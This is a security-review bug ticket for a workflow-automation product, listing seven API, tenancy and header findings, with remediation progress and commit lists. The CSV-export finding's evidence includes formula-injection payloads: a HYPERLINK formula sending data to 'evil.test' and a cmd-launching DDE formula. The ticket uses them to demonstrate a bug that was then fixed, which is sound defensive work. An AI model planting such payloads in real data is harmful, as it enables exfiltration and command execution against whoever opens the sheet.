---
id: BUG-fv5fer
title: 'Event-stream/CORS/tenancy gaps: SSE hang, CORS, onboarding, headers, CSV, pagination'
status: testing
priority: medium
labels:
    - security
    - api
    - full-review
    - wf-c415e773
parent: EPIC-cfe7ny
created: "2026-09-19T12:06:09Z"
updated: "2026-09-20T02:53:21Z"
---

Source: KilasFlow full-review workflow `wf_c415e773-4e1` (Find 14/14 + Verify 14/14 + Critique 1/1). Evidence: live repros against stub/n8n/private instances in `scratchpad/work/<dim>/` (FINDINGS.md, PROGRESS.md) plus journal `wf_c415e773-4e1/journal.jsonl`. Excluded from this epic: 10 verifier-refuted/tracked items (documented bounds, already-open FEAT-1axhdn/FEAT-8mymac halves).

Consolidates 7 finding(s) from dims: find:api-security-tenancy.

---
### Execution event stream never ends for finished/unknown executions (SSE hangs forever) [find:api-security-tenancy] (medium/bug) · area: API /executions/{id}/events · confidence: high

StreamEvents subscribes without reading the durable record (except for embed sessions), so a stream for a finished, restart-lost, or entirely nonexistent execution id stays open indefinitely, emitting only heartbeats and never a terminal event.

Evidence: Private :8107 with tenant API key: GET /executions/exec_totally_bogus_id/events -> 200 and held open (curl -m 3 timed out at 3.0s). Same for an execution that finished before a server restart. A fresh run instead replays events and closes on the terminal event. Handler comment claims the durable record is read first, but that read only happens for embed sessions.

Impact: Editor/SDK subscribers to an old run (after a restart, or in an api/worker split where the API broker missed the events) spin forever; any caller can pin unbounded open SSE goroutines against arbitrary/nonexistent ids.

Suggested fix: Load the execution tenant-scoped before subscribing: 404 unknown ids; if the run is already terminal (and no retained events remain after ?from), emit a synthetic terminal event with the final status and close; cap concurrent streams per principal.

Files: internal/api/handlers/executions.go, internal/events/events.go

---
### Documented cross-origin event streaming can't work: the API sends no CORS headers [find:api-security-tenancy] (medium/bug) · area: API / SDK / embedding · confidence: high

The embedding guide and SDK call subscribeExecutionEvents from the host page (a different, embed-allowed origin) using a stream ticket, but the events endpoint (and the API generally) emits no Access-Control-Allow-Origin, so the browser blocks it — and the blocked request still spends the single-use ticket.

Evidence: Real browser (playwright) on http://127.0.0.1:8097 opening EventSource to http://127.0.0.1:8107/api/v1/executions/<id>/events?ticket=<fresh> -> console 'blocked by CORS policy: No Access-Control-Allow-Origin header'; server still logged the request (ticket consumed). OPTIONS preflight to /api/v1/* returns 401 from the auth gate. No Access-Control-* handling exists in internal/ or cmd/. docs/src/content/docs/guides/embedding.md step 4 and sdk/README.md:207 document this exact cross-origin usage.

n8n behavior: N/A.

Impact: The advertised embed observability path is broken for any real cross-origin host; the ticket is burned on each blocked attempt.

Suggested fix: Add a CORS layer (reflecting only embed.allowed_origins, answering preflight before auth, no-credentials) for the events endpoint, or change docs/SDK to stream inside the iframe and forward via postMessage.

Files: internal/api/server.go, internal/api/middleware/auth.go, sdk/src/browser.ts, docs/src/content/docs/guides/embedding.md

---
### No product path to onboard a second tenant or user (multi-tenant/white-label requires raw SQL) [find:api-security-tenancy] (medium/unfinished) · area: identity / tenancy API · confidence: high

The API exposes only login/logout/me, api-keys (caller's tenant only), and stream-tickets — no tenant, user, invitation, password-change, or user-disable operations. A tenant can only be created by seeding a DB row and users only by the one-time bootstrap, so the flagship multi-tenant embedding scenario cannot be provisioned through the product.

Evidence: OpenAPI lists no /tenants or /users. /api-keys mints only for the caller's tenant; CreateUser runs only when zero users exist (bootstrap). docs concepts/tenancy-and-embedding.md:270 'Nothing creates a tenant through the API'; sdk/examples/reference-host/README.md:39-46 instructs operators to run INSERT INTO tenants and call store-layer CreateUser/CreateAPIKey (not reachable via the shipped binary). This audit had to insert tenant-b + its user with sqlite3 to get a second tenant.

n8n behavior: n8n has owner-driven user invitation, roles, password reset/disable, and a /users public API.

Impact: An operator running the distributed binary cannot stand up a second tenant, invite users, rotate/disable accounts, or reset passwords without direct DB access — a gap for the multi-tenant white-label goal.

Suggested fix: Add an operator-scoped admin surface (at minimum a `kilasflow tenant/user/key` CLI; ideally an operator/root API-key role for POST /tenants, tenant key minting, and user CRUD/password change).

Files: internal/api/handlers/auth.go, internal/repository/auth.go, cmd/kilasflow/main.go

---
### SPA and /embed pages send no clickjacking or content-type-hardening headers [find:api-security-tenancy] (low/security) · area: web handler · confidence: high

The dashboard SPA and /embed pages return no Content-Security-Policy frame-ancestors, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy, so the dashboard can be framed by any page and /embed by non-allowlisted origins (the config already knows embed.allowed_origins).

Evidence: curl -D - http://127.0.0.1:8107/app/workflows and /embed/<id> return only Content-Type + X-Request-Id. By contrast /docs already emits a full CSP with frame-ancestors 'self'.

n8n behavior: N/A.

Impact: Clickjacking of destructive dashboard actions (a same-site sibling host receives the Lax session cookie); /embed framable outside its allowlist.

Suggested fix: web.Handler should emit frame-ancestors 'self' (+X-Frame-Options: SAMEORIGIN) for /app, frame-ancestors of embed.allowed_origins for /embed, and nosniff + Referrer-Policy on all.

Files: internal/web/handler.go, internal/api/routes.go

---
### CSV export performs no formula-injection neutralisation [find:api-security-tenancy] (low/security) · area: datastores CSV export · confidence: high

Datastore CSV export writes cell text verbatim, so a value beginning with = + - @ (which can arrive from untrusted webhook input into a datastore) becomes an active formula when the operator opens the exported sheet in Excel/Sheets.

Evidence: Wrote rows note='=HYPERLINK("http://evil.test/"&A1,"click")' and note="+cmd|'/C calc'!A0" via POST /datastores/{id}/rows, then GET /datastores/{id}/rows/export returned them unmodified (quoting escapes only quotes, not the leading =). csvExportCell (datastores_csv.go) returns strings unchanged.

n8n behavior: N/A.

Impact: Spreadsheet formula injection / data exfiltration against the host operator who exports and opens a datastore populated (partly) by external input.

Suggested fix: Prefix any cell beginning with = + - @ tab or CR with a single quote (OWASP CSV-injection mitigation) on export; add a test.

Files: internal/api/handlers/datastores_csv.go

Existing tickets: FEAT-t26rt7

---
### reference-host onboarding docs are broken (wrong bootstrap env var, missing image, wrong key format) [find:api-security-tenancy] (low/docs) · area: sdk/examples/reference-host · confidence: high

The multi-tenant reference-host README's setup commands won't work: it uses KILASFLOW_BOOTSTRAP_EMAIL (loader reads KILASFLOW_AUTH_BOOTSTRAP_EMAIL) so no owner is created and the next login fails; the docker run has no image argument; and it shows keys as 'kfa1.…' while real keys are 'kfa1_<prefix>_<secret>'. No embed signing key/origin is set although step 4 embeds the editor.

Evidence: sdk/examples/reference-host/README.md:23-27 (`-e KILASFLOW_BOOTSTRAP_EMAIL=...`, docker run ends in backslash+comment, no image), :51-52 ('kfa1.…'). Correct name in config.example.yaml:168 and docs/install.md:119; real format in internal/auth/keys.go (KeyVersion+'_').

n8n behavior: N/A.

Impact: A user following the flagship multi-tenant example cannot bring it up; erodes trust in the embedding story.

Suggested fix: Fix env var names, add an image tag and KILASFLOW_EMBED_SIGNING_KEY/KILASFLOW_EMBED_ALLOWED_ORIGINS, fix the key format; add a doc test that greps env names against the config reference.

Files: sdk/examples/reference-host/README.md

---
### Tenant list endpoints are unpaginated and load full documents [find:api-security-tenancy] (low/perf) · area: api list handlers / repository · confidence: high

GET /workflows, /credentials, /datastores, /schedules, and /api-keys have no limit/cursor and return every row in the tenant; the workflow list additionally loads each workflow's latest version document, inconsistent with /executions and /workflows/{id}/versions which cap at 100.

Evidence: GET /workflows?limit=1000000 -> 200 returning all rows (no limit param in OpenAPI); GORMWorkflowStore.List has no LIMIT and calls storedWorkflow (loads each latest document). Same unbounded pattern in credentials/datastores/schedules/api-keys handlers.

n8n behavior: n8n paginates list endpoints.

Impact: A tenant with many workflows makes every list load all documents into memory; on a shared host one abusive tenant can degrade the process.

Suggested fix: Add limit+keyset-cursor pagination to these lists (as executions already has) and drop the full document from the workflow list DTO.

Files: internal/api/handlers/workflows.go, internal/repository/workflows.go, internal/api/handlers/credentials.go, internal/api/handlers/datastores.go

## Acceptance criteria

- [ ] Execution event stream never ends for finished/unknown executions (SSE hangs forever)
- [ ] Documented cross-origin event streaming can't work: the API sends no CORS headers
- [ ] No product path to onboard a second tenant or user (multi-tenant/white-label requires raw SQL)
- [ ] SPA and /embed pages send no clickjacking or content-type-hardening headers
- [ ] CSV export performs no formula-injection neutralisation
- [ ] reference-host onboarding docs are broken (wrong bootstrap env var, missing image, wrong key format)
- [ ] Tenant list endpoints are unpaginated and load full documents
- [ ] Adversarial re-verify against live stub/n8n like the Verify phase (no code-only close)
## Progress 2026-09-19 (SecurityDx)
- Status: doing. Research + partial implementation done this session.

## Progress 2026-09-19 (SecurityFront2) — mostly landed, still doing
Status: doing (three of seven findings landed by me + two agents this wave).
- SSE hang (finding 1) — LANDED by me, see BUG-y57cz4 for the detail: the durable
  record is read before the stream opens (real 404 for unknown ids and for another
  workflow's execution), a finished run with nothing left to replay emits a
  reconstructed terminal frame and closes, a broker-dropped stream does the same, and
  concurrent streams are capped at 32 per tenant. No scoped test run yet (sibling
  packages were mid-edit); re-run `go test ./internal/api/ -run Events`.
- CORS (finding 2) — LANDED: internal/api/middleware/cors.go by agent ApiLists (commit
  69e7f02), mounted by me in internal/api/server.go BEFORE the auth gate so a preflight
  (which carries no credential by definition) is answered; reflects only
  embed.allowed_origins, answers OPTIONS 204, never allows credentials.
- Framing headers (finding 4) — LANDED by ApiLists in internal/web/embed.go:
  frame-ancestors 'self' for /app, the configured allowlist for /embed (X-Frame-Options
  omitted there because it cannot express a list), nosniff + Referrer-Policy everywhere.
  Wired in internal/api/routes.go by ApiLists.
- CSV formula neutralisation (finding 5) — LANDED by ApiLists in
  internal/api/handlers/datastores_csv.go.
- Pagination (finding 7) — LANDED by ApiLists for workflows (ListSummaries), schedules
  (ListPage) and datastores (ListDatastoresPage): limit (1..500, default 100) + keyset
  cursor, body shape unchanged, next cursor in the X-Next-Cursor header so the
  SvelteKit dashboard keeps working, ErrInvalidCursor -> 400. NOT done: credentials.go
  (mine — pattern recorded in BUG-y57cz4) and api-keys in internal/api/handlers/auth.go
  (AuthHardening's file).
- Onboarding (finding 3) — LANDED by agent TenancyAdmin (commit ca313a9): operator-only
  admin surface, GET/POST /tenants, GET/POST /tenants/{id}/users,
  POST /tenants/{id}/users/{userId}/disable|enable|password, POST /tenants/{id}/api-keys.
  Gate is key-only on the operator tenant; a customer key, a customer session, an
  operator-tenant session and no identity are each 403 on all 9 routes; an embed token
  is refused by permits()'s default deny. The operator key is registered at boot from
  KILASFLOW_AUTH_OPERATOR_KEY (config + main.go wiring landed by me).
- Docs (finding 6) — reference-host README is owned by DXOps2; the corrected text was
  handed to them via hub by TenancyAdmin. Not yet confirmed landed.
Unverified: no scoped test re-run for the SSE half from my side; ApiLists' and
TenancyAdmin's own scoped tests are green per their reports.

## Work Evidence

Closed by `pine close --evidence` on 2026-09-20.

- Base: `bf802ab8` (last commit at or before ticket created 2026-09-19)
- Commits (17):
  - `a5de19a1` — BUG-fv5fer: page the credential listing with a keyset cursor — api/repository
  - `c07e3ca7` — BUG-fv5fer: prove an exported datastore sheet carries no live formula — api
  - `4f48770c` — BUG-fv5fer: prove the preflight and the stream response carry CORS headers through the server — api
  - `9b2df7bd` — BUG-fv5fer: page the workflow, schedule and datastore lists behind X-Next-Cursor — api handlers
  - `2678cc1d` — BUG-fv5fer: give the SPA handler the embed allowlist for its frame-ancestors policy — api routes
  - `ae30fadf` — BUG-fv5fer: keyset-paginated API key listing for the identity surface — repository
  - `5693d985` — BUG-cq4yk3: webhook path labels are not identities — one path may bind several methods and be reused — repository
  - `3f7e58b5` — BUG-9853ay: confine an embed session's document to what its workflow may reference — embed/tenancy
  - `484d2933` — BUG-fv5fer: bound the schedule listing with a keyset cursor — repository
  - `a2c84181` — BUG-fv5fer: page the datastore catalogue and batch its column reads — datastore
  - `8c18d71a` — BUG-fv5fer: page the workflow listing with a keyset cursor and stop loading every latest document — repository
  - `262dfa9d` — BUG-fv5fer: read one tenant through the grouped listing — admin
  - `4ff59417` — BUG-fv5fer: neutralise spreadsheet formulas in CSV export and undo it on import — datastores csv
  - `a5f701b4` — BUG-fv5fer: frame-ancestors, nosniff and referrer policy on SPA and embed pages — web
  - `69e7f02d` — BUG-fv5fer: reflect embed-allowed origins and answer preflight before the auth gate — api middleware
  - `2930a34c` — SecurityDx: progress notes — xf1wqm+s0wy50 landed, safehttp partial, rest doing
  - `b4f21475` — chore(pine): track EPIC-cfe7ny full-review remediation backlog (50 tickets)
- Files changed (base → working tree):

```
 .env.example                                       |    2 +-
 .github/workflows/ci.yml                           |   76 +-
 .github/workflows/release.yml                      |    3 +-
 .gitignore                                         |   11 +-
 .pine/tickets/BUG-1tj5wy.md                        |  499 ++++
 .pine/tickets/BUG-277a2m.md                        |  506 ++++
 .pine/tickets/BUG-341sxn.md                        |   40 +
 .pine/tickets/BUG-4053h6.md                        |  921 +++++++
 .pine/tickets/BUG-57n76x.md                        |  576 +++++
 .pine/tickets/BUG-66es9z.md                        |  248 ++
 .pine/tickets/BUG-6as5y7.md                        |  669 +++++
 .pine/tickets/BUG-6bqh51.md                        |  640 +++++
 .pine/tickets/BUG-6jvcs5.md                        |  689 ++++++
 .pine/tickets/BUG-8dmp5y.md                        |  639 +++++
 .pine/tickets/BUG-8h4yy1.md                        |  496 ++++
 .pine/tickets/BUG-8sb0jw.md                        |  695 ++++++
 .pine/tickets/BUG-8t94wn.md                        |  628 +++++
 .pine/tickets/BUG-9853ay.md                        |  534 ++++
 .pine/tickets/BUG-9x3te4.md                        |   23 +
 .pine/tickets/BUG-a1648n.md                        |  110 +
 .pine/tickets/BUG-a9mp5a.md                        |  Bin 0 -> 38076 bytes
 .pine/tickets/BUG-aede06.md                        |  794 ++++++
 .pine/tickets/BUG-c241hm.md                        |  607 +++++
 .pine/tickets/BUG-cq4yk3.md                        |  795 ++++++
 .pine/tickets/BUG-dndnhn.md                        |  497 ++++
 .pine/tickets/BUG-esb9sh.md                        |  590 +++++
 .pine/tickets/BUG-f9frth.md                        |  870 +++++++
 .pine/tickets/BUG-fv5fer.md                        |  172 ++
 .pine/tickets/BUG-gaavr5.md                        |  363 +++
 .pine/tickets/BUG-hfhzq6.md                        |   49 +
 .pine/tickets/BUG-hm76dq.md                        |  119 +
 .pine/tickets/BUG-j7rtv3.md                        |   90 +
 .pine/tickets/BUG-kzkvv6.md                        |   74 +
 .pine/tickets/BUG-mewhrd.md                        |   68 +
 .pine/tickets/BUG-mz8xrb.md                        |   56 +
 .pine/tickets/BUG-npfz43.md                        |   38 +
 .pine/tickets/BUG-pwckhd.md                        |   63 +
 .pine/tickets/BUG-qmgz2f.md                        |  179 ++
 .pine/tickets/BUG-qq4xva.md                        |   57 +
 .pine/tickets/BUG-rjd6fm.md                        |  272 ++
 .pine/tickets/BUG-rrkjrd.md                        |   76 +
 .pine/tickets/BUG-s0wy50.md                        |   56 +
 .pine/tickets/BUG-t2wezf.md                        |   85 +
 .pine/tickets/BUG-tcqkad.md                        |  188 ++
 .pine/tickets/BUG-txc9xg.md                        |   71 +
 .pine/tickets/BUG-wdypd2.md                        |  230 ++
 .pine/tickets/BUG-wp2y0y.md                        |   45 +
 .pine/tickets/BUG-xf1wqm.md                        |   42 +
 .pine/tickets/BUG-y57cz4.md                        |  167 ++
 .pine/tickets/BUG-ysvmaa.md                        |  298 +++
 .pine/tickets/BUG-ze1nn8.md                        |  114 +
 .pine/tickets/BUG-ztzxck.md                        |   56 +
 .pine/tickets/EPIC-cfe7ny.md                       |   39 +
 .pine/tickets/FEAT-0895qc.md                       |  311 +++
 .pine/tickets/FEAT-15k49d.md                       |   37 +
 .pine/tickets/FEAT-56nep4.md                       |  175 ++
 .pine/tickets/FEAT-cwmw90.md                       |   21 +
 .pine/tickets/FEAT-edxxj7.md                       |  188 ++
 .pine/tickets/FEAT-j5s2n4.md                       |  188 ++
 .pine/tickets/FEAT-jvembs.md                       |  363 +++
 .pine/tickets/FEAT-nqpvf6.md                       |  161 ++
 .pine/tickets/FEAT-qdedm0.md                       |   23 +
 .pine/tickets/FEAT-x5km1z.md                       |  142 ++
 Dockerfile                                         |   15 +-
 Makefile                                           |  114 +-
 README.md                                          |   27 +-
 cmd/kilasflow/main.go                              |  158 +-
 cmd/kilasflow/retention_test.go                    |   87 +
 compose.postgres.yaml                              |    9 +-
 compose.yaml                                       |   16 +-
 config.example.yaml                                |   13 +-
 devbox.json                                        |    2 -
 docs/astro.config.mjs                              |    4 +-
 docs/src/content/docs/404.md                       |    2 +-
 docs/src/content/docs/concepts/execution-model.md  |  210 +-
 docs/src/content/docs/concepts/expressions.md      |   99 +-
 docs/src/content/docs/concepts/node-registry.md    |   35 +-
 .../src/content/docs/concepts/safety-boundaries.md |  119 +-
 docs/src/content/docs/concepts/webhooks.md         |   62 +-
 docs/src/content/docs/guides/community-nodes.md    |    2 +-
 docs/src/content/docs/guides/embedding.md          |   16 +-
 docs/src/content/docs/guides/n8n-migration.md      |  127 +-
 docs/src/content/docs/guides/node-authoring.md     |   10 +-
 docs/src/content/docs/index.mdx                    |    2 +-
 .../docs/operate/configuration-reference.md        |   13 +-
 docs/src/content/docs/operate/deployment.md        |   26 +-
 docs/src/content/docs/operate/security.md          |   52 +-
 docs/src/content/docs/operate/upgrades.md          |   17 +-
 docs/src/content/docs/reference/api-contract.md    |   13 +-
 docs/src/content/docs/reference/api.md             |    6 +-
 docs/src/content/docs/reference/api/auth.md        |   11 +-
 docs/src/content/docs/reference/api/credentials.md |    2 +-
 docs/src/content/docs/reference/api/datastores.md  |  392 +++
 docs/src/content/docs/reference/api/embed.md       |    6 +-
 docs/src/content/docs/reference/api/executions.md  |    4 +-
 docs/src/content/docs/reference/api/interop.md     |    4 +-
 docs/src/content/docs/reference/api/nodes.md       |    2 +-
 docs/src/content/docs/reference/api/schedules.md   |   11 +-
 docs/src/content/docs/reference/api/system.md      |    4 +-
 docs/src/content/docs/reference/api/tenants.md     |  200 ++
 docs/src/content/docs/reference/api/workflows.md   |   12 +-
 .../content/docs/reference/expression-grammar.md   |  369 ++-
 docs/src/content/docs/start/install.md             |   44 +-
 docs/src/content/docs/start/what-kilasflow-is.md   |   91 +-
 e2e/fixtures/datastore.ts                          |    8 +-
 e2e/fixtures/epic-telegram.ts                      |   24 +-
 e2e/fixtures/gates.ts                              |   31 +
 e2e/fixtures/library-import.ts                     |   13 +-
 e2e/fixtures/n8n-live.ts                           |   10 +-
 e2e/playwright.config.ts                           |    4 +
 e2e/scripts/skip-budget.mjs                        |  107 +
 e2e/skip-budget.json                               |   25 +
 e2e/tests/ai-agent-ollama.spec.ts                  |   30 +-
 e2e/tests/epic-acceptance.spec.ts                  |    8 +-
 e2e/tests/library-import.spec.ts                   |    8 +-
 e2e/tests/waha-migration.spec.ts                   |    6 +-
 internal/ai/agent.go                               |  101 +-
 internal/ai/ai.go                                  |   31 +-
 internal/ai/ai_test.go                             |  132 +-
 internal/ai/memory.go                              |   21 +
 internal/ai/openai.go                              |  140 +-
 internal/ai/openai_test.go                         |  145 ++
 internal/ai/outputschema.go                        |   16 +
 internal/api/cors_test.go                          |  102 +
 internal/api/credentials_pagination_test.go        |   76 +
 internal/api/csv_export_test.go                    |   66 +
 internal/api/embed_confinement_test.go             |  284 +++
 internal/api/handlers/admin.go                     |  524 ++++
 internal/api/handlers/admin_admin_test.go          |  579 +++++
 internal/api/handlers/auth.go                      |  233 +-
 internal/api/handlers/auth_test.go                 |  366 +++
 internal/api/handlers/credentials.go               |   37 +-
 internal/api/handlers/datastores.go                |   32 +-
 internal/api/handlers/datastores_csv.go            |   72 +
 internal/api/handlers/datastores_csv_test.go       |  147 ++
 internal/api/handlers/embed.go                     |   14 +-
 internal/api/handlers/embedscope.go                |  126 +
 internal/api/handlers/executions.go                |  318 ++-
 internal/api/handlers/interop.go                   |  130 +-
 internal/api/handlers/problem.go                   |   31 +
 internal/api/handlers/schedules.go                 |   35 +-
 internal/api/handlers/workflows.go                 |  175 +-
 internal/api/handlers/workflows_conflict_test.go   |  125 +
 internal/api/handlers/workflows_delete_test.go     |    4 +-
 internal/api/import_diagnostics_test.go            |  142 ++
 internal/api/list_pagination_test.go               |  221 ++
 internal/api/middleware/auth.go                    |   82 +-
 internal/api/middleware/auth_test.go               |  436 ++++
 internal/api/middleware/clientip.go                |   50 +
 internal/api/middleware/cors.go                    |  132 +
 internal/api/middleware/cors_test.go               |  189 ++
 internal/api/middleware/loginlimit.go              |  203 ++
 internal/api/middleware/loginlimit_test.go         |  172 ++
 internal/api/middleware/sessioncache.go            |  156 ++
 internal/api/openapi_security_test.go              |  196 ++
 internal/api/routes.go                             |   14 +-
 internal/api/server.go                             |  123 +-
 internal/api/workflows_test.go                     |   88 +-
 internal/auth/auth_test.go                         |   42 +-
 internal/auth/session.go                           |   94 +-
 internal/auth/session_internal_test.go             |   49 +
 internal/binary/binary.go                          |   15 +-
 internal/conditions/conditions.go                  |  455 +++-
 internal/conditions/conditions_test.go             |  195 ++
 internal/conditions/doc.go                         |    8 +
 internal/config/boot_strictness_test.go            |  257 ++
 internal/config/config.go                          |  305 ++-
 internal/credentials/redirect_test.go              |  141 ++
 internal/credentials/registry.go                   |   16 +-
 internal/database/migrate.go                       |   59 +-
 internal/database/migrate_test.go                  |   45 +
 internal/datastore/catalogue.go                    |  154 +-
 internal/datastore/catalogue_test.go               |  115 +
 internal/datastore/fleet.go                        |    9 +-
 internal/embed/confinement.go                      |  156 ++
 internal/embed/confinement_test.go                 |  142 ++
 internal/embed/embed.go                            |   16 +
 internal/engine/approval.go                        |   17 +-
 internal/engine/authenticate.go                    |   45 +-
 internal/engine/authenticate_test.go               |  135 +
 internal/engine/checkpoint.go                      |   24 +
 internal/engine/error_workflow_test.go             |  230 ++
 internal/engine/expression_context_test.go         |   71 +
 internal/engine/lease_test.go                      |  401 +++
 internal/engine/live_progress_test.go              |  187 ++
 internal/engine/loopstate_test.go                  |  183 ++
 internal/engine/multiprocess_test.go               |  115 +-
 internal/engine/runner.go                          | 1670 +++++++++----
 internal/engine/runner_test.go                     | 1473 ++++++++++-
 internal/engine/service.go                         |  724 +++++-
 internal/engine/service_test.go                    |  385 ++-
 internal/engine/subworkflow_test.go                |    2 +-
 internal/engine/trace_persist_test.go              |  159 ++
 internal/engine/trace_test.go                      |    8 +-
 internal/engine/wait_service.go                    |  174 +-
 internal/engine/wait_service_test.go               |  232 +-
 internal/engine/worker_test.go                     |   15 +
 internal/expression/doc.go                         |   94 +-
 internal/expression/evaluator.go                   |  771 ++++++
 internal/expression/expression.go                  |  474 +---
 internal/expression/expression_test.go             |   56 +-
 internal/expression/functions.go                   |  219 --
 internal/expression/globals.go                     |  528 ++++
 internal/expression/luxon.go                       |  320 +++
 internal/expression/methods.go                     | 1187 +++++++++
 internal/expression/parity_test.go                 |  505 ++++
 internal/expression/parser.go                      |  824 +++++++
 internal/expression/roots.go                       |  339 ++-
 internal/interop/n8n/corpus/BASELINE.md            |   16 +-
 internal/interop/n8n/corpus/baseline.json          |   43 +-
 internal/interop/n8n/gowa.go                       |   37 +-
 internal/interop/n8n/gowa_test.go                  |   17 +-
 internal/interop/n8n/importer_tail_test.go         |  772 ++++++
 internal/interop/n8n/n8n.go                        |  462 +++-
 internal/interop/n8n/n8n_test.go                   |  177 +-
 internal/interop/n8n/parameters.go                 | 2606 ++++++++++++++++++--
 internal/interop/n8n/trivialcode.go                |  107 -
 internal/interop/n8n/trivialcode_test.go           |  109 -
 internal/interop/n8n/waitsubworkflow_test.go       |  460 ++++
 internal/loadoptions/loadoptions.go                |   11 +
 internal/loadoptions/redirect_test.go              |  117 +
 internal/property/property.go                      |   20 +-
 internal/property/visibility_test.go               |   34 +
 internal/repository/auth.go                        |  388 +++
 internal/repository/auth_admin_test.go             |  477 ++++
 internal/repository/claim_lease_test.go            |  266 ++
 internal/repository/claim_wake_test.go             |    4 +-
 internal/repository/credentials.go                 |  103 +
 internal/repository/execution_retention_test.go    |    3 +-
 internal/repository/executions.go                  |  534 +++-
 internal/repository/import_diagnostics.go          |   83 +
 internal/repository/import_diagnostics_test.go     |  199 ++
 internal/repository/models.go                      |   40 +-
 internal/repository/models_test.go                 |  141 +-
 internal/repository/postgres_execution_test.go     |    4 +-
 internal/repository/prefix_test.go                 |    8 +-
 internal/repository/schedule_list_test.go          |  188 ++
 internal/repository/schedules.go                   |  112 +
 internal/repository/subworkflow_activation_test.go |  153 ++
 internal/repository/tenant_purge_test.go           |    2 +-
 internal/repository/waits_test.go                  |    2 +-
 internal/repository/webhooks.go                    |  188 +-
 internal/repository/webhooks_test.go               |  306 +++
 internal/repository/workflow_history.go            |   14 +-
 internal/repository/workflow_list_test.go          |  196 ++
 internal/repository/workflows.go                   |  233 +-
 internal/safehttp/safehttp.go                      |   54 +-
 internal/safehttp/safehttp_test.go                 |   97 +
 internal/scheduler/doc.go                          |   13 +-
 internal/scheduler/extract.go                      |   52 +
 internal/scheduler/scheduler_test.go               |   67 +
 internal/sqlbuild/sqlbuild_test.go                 |    4 +-
 internal/web/dist/index.html                       |   37 -
 internal/web/embed.go                              |  459 +++-
 internal/web/embed_test.go                         |  335 ++-
 internal/web/placeholder/index.html                |   17 +
 internal/webhook/export_test.go                    |    2 +-
 internal/webhook/form.go                           |  262 ++
 internal/webhook/form_test.go                      |  169 ++
 internal/webhook/request_lifecycle.go              |  425 +++-
 internal/webhook/request_lifecycle_test.go         |  411 +++
 internal/webhook/shape.go                          |  299 ++-
 internal/webhook/shape_test.go                     |  146 +-
 internal/webhook/webhook.go                        |  758 ++++--
 internal/webhook/webhook_test.go                   |  678 ++++-
 internal/workflow/compiler.go                      |   81 +-
 internal/workflow/document.go                      |    4 +
 .../000010_execution_reclaim_count.down.sql        |    7 +
 .../postgres/000010_execution_reclaim_count.up.sql |   17 +
 .../000011_webhook_path_label_index.down.sql       |   12 +
 .../000011_webhook_path_label_index.up.sql         |   22 +
 .../000012_workflow_import_diagnostics.down.sql    |    9 +
 .../000012_workflow_import_diagnostics.up.sql      |   29 +
 .../sqlite/000010_execution_reclaim_count.down.sql |    7 +
 .../sqlite/000010_execution_reclaim_count.up.sql   |   17 +
 .../000011_webhook_path_label_index.down.sql       |   12 +
 .../sqlite/000011_webhook_path_label_index.up.sql  |   22 +
 .../000012_workflow_import_diagnostics.down.sql    |    9 +
 .../000012_workflow_import_diagnostics.up.sql      |   24 +
 nodes/ai.go                                        |  498 +++-
 nodes/ai_test.go                                   |  733 +++++-
 nodes/assignments.go                               |   51 +-
 nodes/core.go                                      |    5 +
 nodes/datastore.go                                 |   41 +-
 nodes/datastore_test.go                            |  228 +-
 nodes/datetime.go                                  |   80 +-
 nodes/datetime_test.go                             |  161 +-
 nodes/embedscope.go                                |  220 ++
 nodes/embedscope_test.go                           |  242 ++
 nodes/error_workflow.go                            |  223 ++
 nodes/error_workflow_test.go                       |  118 +
 nodes/executors.go                                 |   34 +-
 nodes/executors_test.go                            |   66 +
 nodes/http.go                                      |  347 ++-
 nodes/http_test.go                                 |  302 ++-
 nodes/loop.go                                      |  160 +-
 nodes/sql_options_live_test.go                     |   33 +-
 nodes/subworkflow.go                               |   97 +-
 nodes/subworkflow_calls_test.go                    |   56 +
 nodes/telegram_download.go                         |    3 +-
 nodes/telegram_lifecycle.go                        |    7 +-
 nodes/transform.go                                 |   32 +-
 nodes/transform_test.go                            |    8 +-
 nodes/unsupported.go                               |   16 +
 nodes/wait.go                                      |  217 +-
 nodes/webhook.go                                   |  477 +++-
 packs/waha/README.md                               |   22 +
 packs/waha/manifest-202409.json                    |   11 +-
 packs/waha/manifest-202502.json                    |   11 +-
 packs/waha/pack-trigger-202409.json                |   11 +-
 packs/waha/pack-trigger-202502.json                |   11 +-
 packs/waha/waha.go                                 |   83 +-
 packs/waha/waha_test.go                            |  373 ++-
 packs/waha/webhook-lifecycle.json                  |   14 +
 scripts/check-coordinates.sh                       |   60 +
 scripts/generate-api-reference.mjs                 |   30 +-
 scripts/smoke-dev.sh                               |   27 +
 sdk/README.md                                      |   12 +
 sdk/examples/host-page/README.md                   |   11 +-
 sdk/examples/reference-host/README.md              |  122 +-
 sdk/examples/reference-host/package.json           |    2 +-
 sdk/examples/reference-host/server.mjs             |   29 +-
 sdk/package.json                                   |    6 +-
 web/src/lib/api/generated/admin/admin.ts           |  957 +++++++
 web/src/lib/api/generated/auth/auth.ts             |   32 +-
 .../lib/api/generated/credentials/credentials.ts   |   30 +-
 web/src/lib/api/generated/datastores/datastores.ts |   32 +-
 web/src/lib/api/generated/embed/embed.ts           |    2 +-
 web/src/lib/api/generated/executions/executions.ts |    2 +-
 web/src/lib/api/generated/interop/interop.ts       |  115 +-
 .../models/createTenantAPIKeyInputBody.ts          |   17 +
 .../api/generated/models/createTenantInputBody.ts  |   24 +
 .../generated/models/createTenantUserInputBody.ts  |   29 +
 .../lib/api/generated/models/embedSessionBody.ts   |   11 +-
 .../api/generated/models/embedSessionResource.ts   |    1 +
 .../generated/models/executionRequestResource.ts   |    1 +
 web/src/lib/api/generated/models/index.ts          |   15 +
 .../lib/api/generated/models/listApiKeysParams.ts  |   20 +
 .../api/generated/models/listCredentialsParams.ts  |   20 +
 .../api/generated/models/listDatastoresParams.ts   |   20 +
 .../api/generated/models/listSchedulesParams.ts    |   20 +
 .../generated/models/listTenantUsersOutputBody.ts  |   15 +
 .../api/generated/models/listTenantsOutputBody.ts  |   15 +
 .../api/generated/models/listWorkflowsParams.ts    |   20 +
 web/src/lib/api/generated/models/node.ts           |    1 +
 .../api/generated/models/runWorkflowInputBody.ts   |    2 +
 .../generated/models/setUserPasswordInputBody.ts   |   18 +
 web/src/lib/api/generated/models/tenantResource.ts |   17 +
 web/src/lib/api/generated/models/userResource.ts   |   18 +
 .../generated/models/workflowDiagnosticsParams.ts  |   14 +
 .../models/workflowDiagnosticsResource.ts          |   20 +
 .../api/generated/models/workflowDocumentInput.ts  |    2 +
 web/src/lib/api/generated/schedules/schedules.ts   |   32 +-
